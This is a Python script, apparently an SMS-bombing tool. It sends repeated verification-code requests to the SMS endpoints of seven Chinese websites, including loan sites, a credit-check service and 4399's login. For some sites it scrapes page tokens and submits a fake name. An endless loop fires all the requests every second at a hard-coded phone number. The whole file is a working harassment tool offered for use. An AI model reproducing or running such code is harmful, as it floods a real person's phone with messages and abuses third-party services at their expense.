import json
import requests
import time
from lxml import etree


# %% 正规贷款

def zgdk(phone):
    data = {'mobile': phone}
    response = requests.post(url='https://mgjr.360yhzd.com/api/sms/getCode', data=data)
    text = response.text
    if '提交成功' in text:
        print('正规贷款信息发送成功!')
    else:
        print('正规贷款信息发送失败！')


# %% 融多多贷款

def rdd(phone):
    session = requests.session()
    url = 'https://91rongduoduo.com/m/bdss04'
    text = session.get(url).text
    html = etree.HTML(text)
    usertoken = html.xpath('//input[@id="usertoken"]/@value')[0]
    data = {
        'phone': phone,
        'name': '张伟伟',
        'usertoken': usertoken
    }
    response = session.post(url='https://91rongduoduo.com/m/center_code', data=data)
    text = response.text
    if '发送成功' in text:
        print('融多多贷款信息发送成功!')
    else:
        print('融多多贷款信息发送失败！')


# %% 穆帅贷款

def ms(phone):
    session = requests.session()
    url = 'http://msswxx.com/m/mss01'
    text = session.get(url).text
    html = etree.HTML(text)
    usertoken = html.xpath('//input[@id="usertoken"]/@value')[0]
    data = {
        'phone': phone,
        'name': '张伟伟',
        'usertoken': usertoken
    }
    response = session.post(url='http://msswxx.com/m/center_code', data=data)
    text = response.text
    if '发送成功' in text:
        print('穆帅贷款信息发送成功!')
    else:
        print('穆帅贷款信息发送失败！')


# %% 郎宇信息

def lyxx(phone):
    data = {'mobile': phone}
    response = requests.post(url='http://www.lyxxjs.com/msm/code/sendSms.do', data=data)
    text = response.text
    if '发送成功' in text:
        print('郎宇信息信息发送成功!')
    else:
        print('郎宇信息信息发送失败！')


# %% 店透视

def dtx(phone):
    headers = {'Referer': 'https://www.diantoushi.com/useradmin.html?type=searchBlack'}
    url = f'https://www.diantoushi.com/user/v2/captcha?mobile={phone}'
    response = requests.get(url=url, headers=headers)
    if '"status":0,"message":"ok"' in response.text:
        print('店透视信息发送成功!')
    else:
        print('店透视信息发送失败！')


# %% 查征信

def czx(phone):
    headers = {
        'accept': '*/*',
        'content-type': 'application/json',
        'referer': 'https://www.sczhengxin.com/h5/index.html?Channel=bdpcxyd01&bd_vid=10244023290222874317',
        'x-requested-with': 'XMLHttpRequest',
    }
    url = 'https://www.sczhengxin.com/api/home/SmsPush'
    response = requests.post(url=url, data=json.dumps({"PhoneNumber": phone}), headers=headers)
    # print(response.text)
    if '"statusCode":0,"code":1' in response.text:
        print('查征信信息发送成功!')
    else:
        print('查征信信息发送失败！')


# %%  4399
def ssjj(phone):
    url = 'http://ptlogin.4399.com/ptlogin/sendPhoneLoginCode.do?phone={}&appId=www_home&v=1&sig=&t={}&v=1'.format \
        (phone, int(time.time() * 1000))
    response = requests.get(url)
    if '4' in response.text:
        print('4399信息发送成功!')
    else:
        print('4399信息发送失败！')


# %% 轰炸开始
def start(phone):
    while 1:
        rdd(phone)
        zgdk(phone)
        ms(phone)
        lyxx(phone)
        dtx(phone)
        czx(phone)
        ssjj(phone)
        time.sleep(1)


start('18855488486')
